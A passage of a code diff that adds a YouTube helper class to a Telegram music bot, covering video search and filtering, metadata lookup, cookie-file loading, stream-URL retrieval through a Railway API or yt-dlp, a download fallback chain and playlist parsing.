+    result = await _ytdlp_download(link, media_type)
+    if result:
+        return result, "ytdlp"
+
+    logger.error("All download methods failed for: %s", video_id)
+    return None, "none"
+
+
+# ── Public helpers (kept for backward compat with play.py / calls.py) ─────────
+async def download_song(link: str, title: str | None = None) -> str | None:
+    path, _ = await _download_with_fallback(link, "audio")
+    return path
+
+
+async def download_video(link: str, title: str | None = None) -> str | None:
+    path, _ = await _download_with_fallback(link, "video")
+    return path
+
+
+# ── YouTube class ─────────────────────────────────────────────────────────────
+class YouTube:
+    def __init__(self):
+        self.base     = "https://www.youtube.com/watch?v="
+        self.regex    = r"(?:youtube\.com|youtu\.be)"
+        self.listbase = "https://youtube.com/playlist?list="
+        self.reg      = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
+        self.api      = None
+        self.cookies_dir = os.path.join(os.path.dirname(__file__), "..", "cookies")
+        self.dl_stats = {
+            "total_requests": 0,
+            "shruti":         0,
+            "railway":        0,
+            "xbit":           0,
+            "ytdlp":          0,
+            "existing_files": 0,
+            "failed":         0,
+        }
+
+    # ── Validators ────────────────────────────────────────────────────────────
+    def valid(self, url: str) -> bool:
+        return bool(re.search(self.regex, url))
+
+    def invalid(self, url: str) -> bool:
+        return not self.valid(url)
+
+    # ── Cookie management ─────────────────────────────────────────────────────
+    async def save_cookies(self, urls: list) -> None:
+        if not urls:
+            return
+        os.makedirs(self.cookies_dir, exist_ok=True)
+        try:
+            async with aiohttp.ClientSession() as session:
+                for i, url in enumerate(urls):
+                    if not url:
+                        continue
+                    try:
+                        async with session.get(
+                            url, timeout=aiohttp.ClientTimeout(total=15)
+                        ) as resp:
+                            if resp.status == 200:
+                                content = await resp.text()
+                                path = os.path.join(self.cookies_dir, f"cookies_{i}.txt")
+                                with open(path, "w") as f:
+                                    f.write(content)
+                                logger.info("Saved cookies → %s", path)
+                            else:
+                                logger.warning("Cookie fetch failed %s (status %s)", url, resp.status)
+                    except Exception as e:
+                        logger.warning("Cookie error from %s: %s", url, e)
+        except Exception as e:
+            logger.warning("save_cookies error: %s", e)
+
+    # ── URL utilities ─────────────────────────────────────────────────────────
+    async def exists(self, link: str, videoid: Union[bool, str] = None) -> bool:
+        if videoid:
+            link = self.base + link
+        return bool(re.search(self.regex, link))
+
+    async def url(self, message_1: Message) -> Union[str, None]:
+        messages = [message_1]
+        if message_1.reply_to_message:
+            messages.append(message_1.reply_to_message)
+        for message in messages:
+            text = message.text or message.caption or ""
+            if message.entities:
+                for entity in message.entities:
+                    if entity.type == MessageEntityType.URL:
+                        return text[entity.offset: entity.offset + entity.length]
+                    if entity.type == MessageEntityType.TEXT_LINK:
+                        return entity.url
+            if message.caption_entities:
+                for entity in message.caption_entities:
+                    if entity.type == MessageEntityType.TEXT_LINK:
+                        return entity.url
+        return None
+
+    # ── Metadata fetchers ─────────────────────────────────────────────────────
+    async def details(self, link: str, videoid: Union[bool, str] = None):
+        if videoid:
+            link = self.base + link
+        link = _normalize_youtube_link(link)
+        results = VideosSearch(link, limit=1)
+        r = (await results.next())["result"][0]
+        title        = r["title"]
+        duration_min = r["duration"]
+        thumbnail    = r["thumbnails"][0]["url"].split("?")[0]
+        vidid        = r["id"]
+        duration_sec = int(utils.to_seconds(duration_min)) if duration_min else 0
+        return title, duration_min, duration_sec, thumbnail, vidid
+
+    async def title(self, link: str, videoid: Union[bool, str] = None) -> str | None:
+        if videoid:
+            link = self.base + link
+        link = _normalize_youtube_link(link)
+        results = VideosSearch(link, limit=1)
+        for r in (await results.next())["result"]:
+            return r["title"]
+        return None
+
+    async def duration(self, link: str, videoid: Union[bool, str] = None) -> str | None:
+        if videoid:
+            link = self.base + link
+        link = _normalize_youtube_link(link)
+        results = VideosSearch(link, limit=1)
+        for r in (await results.next())["result"]:
+            return r["duration"]
+        return None
+
+    async def thumbnail(self, link: str, videoid: Union[bool, str] = None) -> str | None:
+        if videoid:
+            link = self.base + link
+        link = _normalize_youtube_link(link)
+        results = VideosSearch(link, limit=1)
+        for r in (await results.next())["result"]:
+            return r["thumbnails"][0]["url"].split("?")[0]
+        return None
+
+    async def track(self, link: str, videoid: Union[bool, str] = None):
+        if videoid:
+            link = self.base + link
+        link = _normalize_youtube_link(link)
+        results = VideosSearch(link, limit=1)
+        for r in (await results.next())["result"]:
+            track_details = {
+                "title":        r["title"],
+                "link":         r["link"],
+                "vidid":        r["id"],
+                "duration_min": r["duration"],
+                "thumb":        r["thumbnails"][0]["url"].split("?")[0],
+            }
+            return track_details, r["id"]
+        return None, None
+
+    async def search(
+        self,
+        query: str,
+        message_id: int,
+        video: bool = False,
+    ):
+        """Search YouTube and return a Track dataclass or None.
+        Prioritizes official studio versions, avoids remixes/covers/live etc.
+        """
+        from Lily.helpers import Track
+
+        # Keywords to avoid in results unless explicitly in query
+        avoid_keywords = [
+            "remix", "cover", "live", "slowed", "reverb", "extended", "acoustic", 
+            "instrumental", "karaoke", "8d", "bass boosted", "nightcore", "edit"
+        ]
+        
+        # Check if query explicitly includes any avoid keyword
+        query_lower = query.strip().lower()
+        explicit_avoid = any(kw in query_lower for kw in avoid_keywords)
+
+        try:
+            # First try with "official audio" or "official video" modifier to prioritize official versions
+            search_queries = [
+                f"{query.strip()} official audio",
+                f"{query.strip()} official video",
+                query.strip()
+            ] if not explicit_avoid else [query.strip()]
+
+            for sq in search_queries:
+                results = VideosSearch(sq, limit=10)  # Get more results to filter
+                raw_results = (await results.next())["result"]
+                if not raw_results:
+                    continue
+
+                # Filter results
+                filtered = []
+                for r in raw_results:
+                    title_lower = r.get("title", "").lower()
+                    
+                    # Skip if any avoid keyword in title (unless explicit in query)
+                    if not explicit_avoid:
+                        if any(kw in title_lower for kw in avoid_keywords):
+                            continue
+
+                    # Check duration (skip very short/long)
+                    duration_str = r.get("duration") or "0:00"
+                    parts = duration_str.split(":")
+                    try:
+                        if len(parts) == 3:
+                            secs = int(parts[0]) * 3600 + int(parts[1]) * 60 + int(parts[2])
+                        elif len(parts) == 2:
+                            secs = int(parts[0]) * 60 + int(parts[1])
+                        else:
+                            secs = 0
+                    except (ValueError, IndexError):
+                        secs = 0
+                    
+                    if 30 <= secs <= 3600:  # 30 sec to 1 hour
+                        filtered.append(r)
+                
+                if filtered:
+                    r = filtered[0]  # Take best match
+                    vidid = r["id"]
+                    duration_min = r.get("duration") or "00:00"
+                    duration_sec = int(utils.to_seconds(duration_min)) if duration_min else 0
+                    return Track(
+                        id           = vidid,
+                        title        = r["title"],
+                        url          = r.get("link", self.base + vidid),
+                        duration     = duration_min,
+                        duration_sec = duration_sec,
+                        thumbnail    = r["thumbnails"][0]["url"].split("?")[0],
+                        channel_name = (r.get("channel") or {}).get("name", ""),
+                        message_id   = message_id,
+                        video        = video,
+                        time         = int(_time.time()),
+                    )
+
+            return None
+        except Exception as e:
+            logger.warning("YouTube search error for '%s': %s", query, e)
+            return None
+
+    # ── Slider ────────────────────────────────────────────────────────────────
+    async def slider(self, link: str, query_type: int, videoid: Union[bool, str] = None):
+        if videoid:
+            link = self.base + link
+        link        = _normalize_youtube_link(link)
+        search      = VideosSearch(link, limit=10)
+        raw_results = (await search.next()).get("result", [])
+
+        filtered = []
+        for item in raw_results:
+            duration_str = item.get("duration") or "0:00"
+            parts = duration_str.split(":")
+            try:
+                if len(parts) == 3:
+                    secs = int(parts[0]) * 3600 + int(parts[1]) * 60 + int(parts[2])
+                elif len(parts) == 2:
+                    secs = int(parts[0]) * 60 + int(parts[1])
+                else:
+                    secs = 0
+            except (ValueError, IndexError):
+                continue
+            if 0 < secs <= 3600:
+                filtered.append(item)
+
+        if not filtered or query_type >= len(filtered):
+            raise ValueError("No suitable videos found within duration limit")
+
+        s = filtered[query_type]
+        return s["title"], s.get("duration") or "0:00", s["thumbnails"][0]["url"].split("?")[0], s["id"]
+
+    # ── Formats (yt-dlp) ──────────────────────────────────────────────────────
+    async def formats(self, link: str, videoid: Union[bool, str] = None):
+        if videoid:
+            link = self.base + link
+        link = _normalize_youtube_link(link)
+        ydl = yt_dlp.YoutubeDL({"quiet": True})
+        with ydl:
+            info = ydl.extract_info(link, download=False)
+        formats_available = []
+        for fmt in info.get("formats", []):
+            try:
+                if "dash" not in str(fmt["format"]).lower():
+                    formats_available.append({
+                        "format":      fmt["format"],
+                        "filesize":    fmt.get("filesize"),
+                        "format_id":   fmt["format_id"],
+                        "ext":         fmt["ext"],
+                        "format_note": fmt.get("format_note"),
+                        "yturl":       link,
+                    })
+            except Exception:
+                continue
+        return formats_available, link
+
+    # ── Video stream URL (yt-dlp, no download) ────────────────────────────────
+    async def video(self, link: str, videoid: Union[bool, str] = None):
+        if videoid:
+            link = self.base + link
+        link = _normalize_youtube_link(link)
+        proc = await asyncio.create_subprocess_exec(
+            "yt-dlp", "-g", "-f", "best[height<=?720][width<=?1280]", link,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        stdout, stderr = await proc.communicate()
+        if stdout:
+            return 1, stdout.decode().split("\n")[0]
+        return 0, stderr.decode()
+
+    async def get_stream_url(
+        self,
+        video_id: str,
+        video: bool = False,
+    ) -> str | None:
+        """
+        Get a direct stream URL without downloading (for immediate playback).
+        Tries Railway API first, then yt-dlp.
+        Returns stream URL or None.
+        """
+        link = _normalize_youtube_link(video_id, self.base)
+        
+        # 1. Try Railway API first (fastest)
+        if RAILWAY_YT_API_URL and RAILWAY_YT_API_KEY:
+            try:
+                headers = {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                    "X-API-Key": str(RAILWAY_YT_API_KEY),
+                }
+                endpoint = "play/video/hq" if video else "play/audio"
+                media_url = f"{RAILWAY_YT_API_URL}/{endpoint}?id={video_id}"
+                # The Railway endpoint itself is the stream URL we want! No need for head! Let's return it directly!
+                return media_url
+            except Exception as e:
+                logger.warning("Railway get_stream_url failed: %s", e)
+        
+        # 2. Try yt-dlp for stream URL
+        try:
+            cookie = cookie_txt_file()
+            ydl_opts = {
+                "format": "bestvideo[height<=720]+bestaudio/best[height<=720]" if video else "bestaudio/best",
+                "quiet": True,
+                "no_warnings": True,
+                "cookiefile": cookie,
+            }
+
+            loop = asyncio.get_event_loop()
+            def _run():
+                with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+                    info = ydl.extract_info(link, download=False)
+                    return info.get("url") or (info.get("formats")[-1]["url"] if info.get("formats") else None)
+
+            url = await loop.run_in_executor(None, _run)
+            if url:
+                return url
+        except Exception as e:
+            logger.warning("yt-dlp get_stream_url failed: %s", e)
+            
+        return None
+
+    # ── Download (main method called by play.py / calls.py) ──────────────────
+    async def download(
+        self,
+        video_id: str,
+        video: bool = False,
+        title: str | None = None,
+    ) -> str | None:
+        """
+        Download audio/video by video_id using full fallback chain.
+        Returns file path or None.
+        """
+        self.dl_stats["total_requests"] += 1
+        link = _normalize_youtube_link(video_id, self.base)
+
+        try:
+            result, downloader = await _download_with_fallback(link, "video" if video else "audio")
+            if result:
+                self.dl_stats[downloader] += 1
+                logger.info(
+                    "YouTube.download success: %s (%s) via %s",
+                    video_id,
+                    "video" if video else "audio",
+                    downloader,
+                )
+            else:
+                self.dl_stats["failed"] += 1
+            return result
+        except Exception as e:
+            self.dl_stats["failed"] += 1
+            logger.warning("YouTube.download error for '%s': %s", video_id, e)
+            return None
+
+    # ── Playlist ──────────────────────────────────────────────────────────────
+    async def playlist(
+        self,
+        limit: int,
+        mention: str,
+        link: str,
+        video: bool = False,
+    ) -> list:
+        """Fetch playlist tracks, return list of Track dataclasses."""
+        from Lily.helpers import Track
+
+        link = _normalize_youtube_link(link)
+        try:
+            plist = await Playlist.get(link)
+        except Exception:
+            return []
+
+        tracks = []
+        for data in (plist.get("videos") or [])[:limit]:
+            if not data:
+                continue
+            vidid = data.get("id")
+            if not vidid:
+                continue
+            duration_min = data.get("duration") or "00:00"
+            duration_sec = int(utils.to_seconds(duration_min)) if duration_min else 0
+            thumbs       = data.get("thumbnails") or []
+            thumbnail    = thumbs[0].get("url", "").split("?")[0] if thumbs else ""
+            tracks.append(Track(
+                id           = vidid,
+                title        = data.get("title") or vidid,
+                url          = data.get("link") or self.base + vidid,
+                duration     = duration_min,
+                duration_sec = duration_sec,
+                thumbnail    = thumbnail,
+                user         = mention,
+                video        = video,
+                time         = int(_time.time()),
+            ))
+        return tracks
